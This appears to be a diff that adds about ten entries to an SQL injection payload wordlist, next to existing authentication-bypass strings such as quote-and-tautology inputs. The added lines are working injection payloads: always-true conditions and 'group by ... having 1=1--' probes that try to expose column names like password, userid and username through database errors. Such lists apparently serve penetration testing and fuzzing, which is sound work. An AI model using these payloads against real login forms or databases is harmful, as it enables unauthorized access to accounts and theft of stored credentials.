@@ -27,3 +27,13 @@ or true--
 ')) or (('x'))=(('x
 " or "x"="x
 ") or ("x")=("x
+' and 'one'='one
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+like '%'
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '% 
